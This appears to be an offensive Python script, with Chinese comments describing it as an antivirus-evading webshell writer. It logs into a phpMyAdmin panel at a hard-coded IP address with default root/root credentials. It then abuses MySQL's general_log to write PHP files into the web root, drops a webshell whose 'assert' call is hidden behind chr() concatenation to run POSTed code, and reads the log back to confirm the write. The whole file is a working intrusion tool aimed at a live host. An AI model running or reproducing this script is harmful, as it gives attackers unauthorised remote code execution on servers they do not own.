#!/usr/bin/env python3
"""写免杀webshell 分步版: 只写文件+返回字节数"""
import urllib.request, http.cookiejar, re, urllib.parse, time, base64

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 免杀shell: 用chr()拼接函数名 + assert, 无明文eval/assert
# <?php $f=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);@$f($_POST['x']);?>
shell = "<?php $f=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);@$f($_POST['x']);?>"
b64 = base64.b64encode(shell.encode()).decode()
print("shell b64:", b64, flush=True)

sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/tw.php'")
sql("SET GLOBAL general_log = 'ON'")
r = sql("SELECT '<?php echo var_export(@file_put_contents(\"C:/phpStudy/WWW/yy.php\", base64_decode(\"" + b64 + "\")), true);?>'")
sql("SET GLOBAL general_log = 'OFF'")
time.sleep(1)

import urllib.request as ur
rr = ur.urlopen(urllib.request.Request("http://81.70.245.25/tw.php", headers={"User-Agent":"Mozilla/5.0"}), timeout=8)
body = rr.read().decode("utf-8","ignore")
for line in body.split("\n"):
    if "Query\tSELECT" in line and "file_put" not in line and "general_log" not in line:
        print("写入结果:", line.strip()[line.find("SELECT"):][:60], flush=True)
